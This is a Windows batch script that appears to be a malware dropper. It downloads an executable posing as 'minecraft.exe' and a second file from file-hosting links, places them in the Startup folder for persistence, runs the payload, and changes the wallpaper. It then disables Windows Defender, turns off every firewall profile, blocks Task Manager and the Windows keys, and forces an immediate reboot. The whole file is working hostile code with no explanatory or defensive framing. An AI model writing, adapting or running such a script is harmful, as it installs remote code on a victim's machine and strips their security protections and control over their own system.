@echo off
wget http://download1506.mediafire.com/n3vaue2gbszg/392ocz9y3jwi0wh/minecraft.exe

wget http://download1478.mediafire.com/pxv1y30xt3dg/gw632ba5cio5435/backtrack.jpg

wget https://uc732fa7f6181e7b6b014f764692.dl.dropboxusercontent.com/cd/0/get/BApTlCg7QhyXLsIS379GhOesQXC3LV8-tOd7poXw_lKuK6-TLDgntBa8ZjxKZ1yO9BQYzK58xMcah15IlHJhdiT9x3OXccl0amWRA33LGuLUyfjIQGo5d5fzdx_g9H5VZ-g/file# --no-check-certificate

ren file.* 1.exe

move "1.exe" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

move "backtrack.jpg" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

move "minecraft.exe" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

REG ADD "HKCU\Control Panel\Desktop" /V Wallpaper /T REG_SZ /F /D "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\backtrack.jpg"
REG ADD "HKCU\Control Panel\Desktop" /V WallpaperStyle /T REG_SZ /F /D 2
%SystemRoot%\System32\RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters

cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"

del backtrack.jpg

cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"

set __COMPAT_LAYER=RunAsInvoker
Start 1.exe

REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f

netsh advfirewall set allprofiles state off

netsh advfirewall set currentprofile state off

netsh advfirewall set domainprofile state off

netsh advfirewall set privateprofile state off

netsh advfirewall set publicprofile state off

REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v DisableTaskMgr /t REG_DWORD /d 1 /f

REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoWinKeys /t REG_DWORD /d 1 /f 

del 1.exe

shutdown /r /t 1